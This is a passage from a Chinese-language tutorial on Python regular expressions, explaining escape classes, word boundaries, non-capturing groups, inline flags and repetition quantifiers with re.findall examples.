<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\d’ </span></span><span style="font-family:宋体">匹配数字</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这是一个以</span><span lang="EN-US"><span style="font-family:Times New Roman">’\’</span></span><span style="font-family:宋体">开头的转义字符，</span><span lang="EN-US"><span style="font-family:Times New Roman">’\d’</span></span><span style="font-family:宋体">表示匹配一个数字，即等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[0-9]</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\D’ </span></span><span style="font-family:宋体">匹配非数字</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">这个是上面的反集，即匹配一个非数字的字符，等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[^0-9]</span></span><span style="font-family:宋体">。注意它们的大小写。下面我们还将看到</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的正则规则中很多转义字符的大小写形式，代表互补的关系。这样很好记。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\w’ </span></span><span style="font-family:宋体">匹配字母和数字</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">匹配所有的英文字母和数字，即等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[a-zA-Z0-9]</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\W’ </span></span><span style="font-family:宋体">匹配非英文字母和数字</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">即</span><span lang="EN-US"><span style="font-family:Times New Roman">’\w’</span></span><span style="font-family:宋体">的补集，等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[^a-zA-Z0-9]</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\s’ </span></span><span style="font-family:宋体">匹配间隔符</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">即匹配空格符、制表符、回车符等表示分隔意义的字符，它等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[ \t\r\n\f\v]</span></span><span style="font-family:宋体">。（注意最前面有个空格</span><span lang="EN-US"><span style="font-family:Times New Roman">)</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\S’ </span></span><span style="font-family:宋体">匹配非间隔符</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">即间隔符的补集，等价于</span><span lang="EN-US"><span style="font-family:Times New Roman">[^ \t\r\n\f\v]</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\A’ </span></span><span style="font-family:宋体">匹配字符串开头</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">匹配字符串的开头。它和</span><span lang="EN-US"><span style="font-family:Times New Roman">’^’</span></span><span style="font-family:宋体">的区别是，</span><span lang="EN-US"><span style="font-family:Times New Roman">’\A’</span></span><span style="font-family:宋体">只匹配整个字符串的开头，即使在</span><span lang="EN-US"><span style="font-family:Times New Roman">’M’</span></span><span style="font-family:宋体">模式下，它也不会匹配其它行的行首。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\Z’ </span></span><span style="font-family:宋体">匹配字符串结尾</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">匹配字符串的结尾。它和</span><span lang="EN-US"><span style="font-family:Times New Roman">’$’</span></span><span style="font-family:宋体">的区别是，</span><span lang="EN-US"><span style="font-family:Times New Roman">’\Z’</span></span><span style="font-family:宋体">只匹配整个字符串的结尾，即使在</span><span lang="EN-US"><span style="font-family:Times New Roman">’M’</span></span><span style="font-family:宋体">模式下，它也不会匹配其它各行的行尾。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s= '12 34\n56 78\n90'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'^\d+' , s , re.M )<span style="">          </span>#</span></span><span style="font-family:宋体">匹配位于行首的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['12', '56', '90']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\A\d+’, s , re.M )<span style="">        </span>#</span></span><span style="font-family:宋体">匹配位于字符串开头的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['12']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'\d+$' , s , re.M )<span style="">          </span>#</span></span><span style="font-family:宋体">匹配位于行尾的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['34', '78', '90']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\d+\Z’ , s , re.M )<span style="">        </span>#</span></span><span style="font-family:宋体">匹配位于字符串尾的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['90']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\b’ </span></span><span style="font-family:宋体">匹配单词边界</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">它匹配一个单词的边界，比如空格等，不过它是一个‘</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">’长度字符，它匹配完的字符串不会包括那个分界的字符。而如果用</span><span lang="EN-US"><span style="font-family:Times New Roman">’\s’</span></span><span style="font-family:宋体">来匹配的话，则匹配出的字符串中会包含那个分界符。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s =<span style="">  </span>'abc abcde bc bcd'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\bbc\b’ , s )<span style="">         </span>#</span></span><span style="font-family:宋体">匹配一个单独的单词</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘bc’ </span></span><span style="font-family:宋体">，而当它是其它单词的一部分的时候不匹配</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['bc']<span style="">                                           </span></span></span><span style="font-family:宋体">＃只找到了那个单独的</span><span lang="EN-US"><span style="font-family:Times New Roman">’bc’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\sbc\s’ , s )<span style="">          </span></span></span><span style="font-family:宋体">＃匹配一个单独的单词</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘bc’ </span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">[' bc ']<span style="">                                         </span>#</span></span><span style="font-family:宋体">只找到那个单独的</span><span lang="EN-US"><span style="font-family:Times New Roman">’bc’</span></span><span style="font-family:宋体">，不过注意前后有两个空格，可能有点看不清楚</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\B’ </span></span><span style="font-family:宋体">匹配非边界</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’\b’</span></span><span style="font-family:宋体">相反，它只匹配非边界的字符。它同样是个</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">长度字符。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">接上例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\Bbc\w+’ , s ) <span style="">    </span>#</span></span><span style="font-family:宋体">匹配包含</span><span lang="EN-US"><span style="font-family:Times New Roman">’bc’</span></span><span style="font-family:宋体">但不以</span><span lang="EN-US"><span style="font-family:Times New Roman">’bc’</span></span><span style="font-family:宋体">为开头的单词</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['bcde']<span style="">                                       </span>#</span></span><span style="font-family:宋体">成功匹配了</span><span lang="EN-US"><span style="font-family:Times New Roman">’abcde’</span></span><span style="font-family:宋体">中的</span><span lang="EN-US"><span style="font-family:Times New Roman">’bcde’</span></span><span style="font-family:宋体">，而没有匹配</span><span lang="EN-US"><span style="font-family:Times New Roman">’bcd’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?:)’ </span></span><span style="font-family:宋体">无捕获组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">当你要将一部分规则作为一个整体对它进行某些操作，比如指定其重复次数时，你需要将这部分规则用</span><span lang="EN-US"><span style="font-family:Times New Roman">’(?:’ ‘)’</span></span><span style="font-family:宋体">把它包围起来，而不能仅仅只用一对括号，那样将得到绝对出人意料的结果。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">例：匹配字符串中重复的</span><span lang="EN-US"><span style="font-family:Times New Roman">’ab’</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s=’ababab abbabb aabaab’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’\b(?:ab)+\b’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['ababab']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">如果仅使用一对括号，看看会是什么结果：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’b\(ab)+\b’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['ab']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">这是因为如果只使用一对括号，那么这就成为了一个组</span><span lang="EN-US"><span style="font-family:Times New Roman">(group)</span></span><span style="font-family:宋体">。组的使用比较复杂，将在后面详细讲解。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?# )’ </span></span><span style="font-family:宋体">注释</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">允许你在正则表达式中写入注释，在</span><span lang="EN-US"><span style="font-family:Times New Roman">’(?#’ ‘)’</span></span><span style="font-family:宋体">之间的内容将被忽略。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-family:宋体"><span style="font-size:16px"><code><strong><span lang="EN-US" style="">(?iLmsux) </span></strong></code><code><strong><span style="">编译选项指定<span lang="EN-US"></span></span></strong></code></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US" style=""><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的正则式可以指定一些选项，这个选项可以写在</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">或</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">的参数中，也可以写在正则式里，成为正则式的一部分。这在某些情况下会便利一些。具体的选项含义请看后面的</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">compile</span></span><span style="font-family:宋体">函数的说明。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">此处编译选项</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">’i’ </span></span><span style="font-family:宋体">等价于</span><span style="font-family:宋体">IGNORECASE </span><span style="font-family:宋体">，<span lang="EN-US">L </span>等价于<span lang="EN-US"> LOCAL </span>，<span lang="EN-US">m </span>等价于 </span><span lang="EN-US" style=""><span style="font-family:Times New Roman">MULTILINE </span></span><span style="font-family:宋体">，</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">s </span></span><span style="font-family:宋体">等价于</span><span style="font-family:Times New Roman"><span style=""> </span><span lang="EN-US" style="">DOTALL </span></span><span style="font-family:宋体">，</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">u </span></span><span style="font-family:宋体">等价于</span><span style=""><span style="font-family:Times New Roman"> </span></span><span style="font-family:宋体">UNICODE </span><span style="font-family:宋体">，<span lang="EN-US"> x </span>等价于 </span><span lang="EN-US" style=""><span style="font-family:Times New Roman">VERBOSE </span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">请注意它们的大小写。在使用时可以只指定一部分，比如只指定忽略大小写，可写为</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘(?i)’</span></span><span style="font-family:宋体">，要同时忽略大小写并使用多行模式，可以写为</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘(?im)’</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">另外要注意选项的有效范围是整条规则，即写在规则的任何地方，选项都会对全部整条正则式有效。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">1.2 </span></span><span style="font-family:宋体">重复</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">正则式需要匹配不定长的字符串，那就一定需要表示重复的指示符。</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的正则式表示重复的功能很丰富灵活。重复规则的一般的形式是在一条字符规则后面紧跟一个表示重复次数的规则，已表明需要重复前面的规则一定的次数。重复规则有：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘*’<span style="">   </span>0</span></span><span style="font-family:宋体">或多次匹配</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">表示匹配前面的规则</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">次或多次。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘+’<span style="">   </span>1</span></span><span style="font-family:宋体">次或多次匹配</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">表示匹配前面的规则至少</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">次，可以多次匹配</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">例：匹配以下字符串中的前一部分是字母，后一部分是数字或没有的变量名字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s = ‘ aaa bbb111 cc22cc 33dd ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\b[a-z]+\d*\b’ , s )<span style="">             </span>#</span></span><span style="font-family:宋体">必须至少</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">个字母开头，以连续数字结尾或没有数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['aaa', 'bbb111']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">注意上例中规则前后加了表示单词边界的</span><span lang="EN-US"><span style="font-family:Times New Roman">’\b’</span></span><span style="font-family:宋体">指示符，如果不加的话结果就会变成：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’[a-z]+\d*’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">['aaa', 'bbb111', 'cc22', 'cc', 'dd']<span style="">    </span>#</span></span><span style="font-family:宋体">把单词给拆开了</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">大多数情况下这不是我们期望的结果。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘?’<span style="">   </span>0</span></span><span style="font-family:宋体">或</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">次匹配</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">只匹配前面的规则</span><span lang="EN-US"><span style="font-family:Times New Roman">0</span></span><span style="font-family:宋体">次或</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">次。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">例，匹配一个数字，这个数字可以是一个整数，也可以是一个科学计数法记录的数字，比如</span><span lang="EN-US"><span style="font-family:Times New Roman">123</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">10e3</span></span><span style="font-family:宋体">都是正确的数字。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s = ‘ 123 10e3 20e4e4 30ee5 ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’ \b\d+[eE]?\d*\b’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['123', '10e3']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">它正确匹配了</span><span lang="EN-US"><span style="font-family:Times New Roman">123</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">10e3,</span></span><span style="font-family:宋体">正是我们期望的。注意前后的</span><span lang="EN-US"><span style="font-family:Times New Roman">’\b’</span></span><span style="font-family:宋体">的使用，否则将得到不期望的结果。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:Times New Roman"><strong style=""><span lang="EN-US">1.2.1</span></strong><strong style=""><span lang="EN-US"> </span></strong></span><strong style=""><span style="font-family:宋体">精确匹配和最小匹配</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">正则式还可以精确指定匹配的次数。指定的方式是</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman"><span style="font-size:16px">‘{m}’<span style="">      </span></span></span></span></strong><span style="font-size:16px"><strong style=""><span style="font-family:宋体">精确匹配</span><span lang="EN-US"><span style="font-family:Times New Roman">m</span></span><span style="font-family:宋体">次</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman"><span style="font-size:16px">‘{m,n}’<span style="">   </span></span></span></span></strong><span style="font-size:16px"><strong style=""><span style="font-family:宋体">匹配最少</span><span lang="EN-US"><span style="font-family:Times New Roman">m</span></span><span style="font-family:宋体">次，最多</span><span lang="EN-US"><span style="font-family:Times New Roman">n</span></span><span style="font-family:宋体">次。</span><span lang="EN-US"><span style="font-family:Times New Roman">(n&gt;m)</span></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">如果你只想指定一个最少次数或只指定一个最多次数，你可以把另外一个参数空起来。比如你想指定最少</span><span lang="EN-US"><span style="font-family:Times New Roman">3</span></span><span style="font-family:宋体">次，可以写成</span><span lang="EN-US"><span style="font-family:Times New Roman"> {3,} </span></span><span style="font-family:宋体">（注意那个逗号），同样如果只想指定最大为</span><span lang="EN-US"><span style="font-family:Times New Roman">5</span></span><span style="font-family:宋体">次，可以写成</span><span lang="EN-US"><span style="font-family:Times New Roman">{<!-- --></span></span><span style="font-family:宋体">，</span><span lang="EN-US"><span style="font-family:Times New Roman">5}</span></span><span style="font-family:宋体">，也可以写成</span><span lang="EN-US"><span style="font-family:Times New Roman">{0,5}</span></span><span style="font-family:宋体">。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span style="font-family:宋体">例</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">寻找下面字符串中</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">a</span></span><span style="font-family:宋体">：</span><span lang="EN-US"><span style="font-family:Times New Roman">3</span></span><span style="font-family:宋体">位数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">b: 2</span></span><span style="font-family:宋体">位数到</span><span lang="EN-US"><span style="font-family:Times New Roman">4</span></span><span style="font-family:宋体">位数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">c: 5</span></span><span style="font-family:宋体">位数以上的数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">d: 4</span></span><span style="font-family:宋体">位数以下的数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s= ‘ 1 22 333 4444 55555 666666 ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\b\d{3}\b’ , s )<span style="">            </span># a</span></span><span style="font-family:宋体">：</span><span lang="EN-US"><span style="font-family:Times New Roman">3</span></span><span style="font-family:宋体">位数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['333']</span></span></p> 
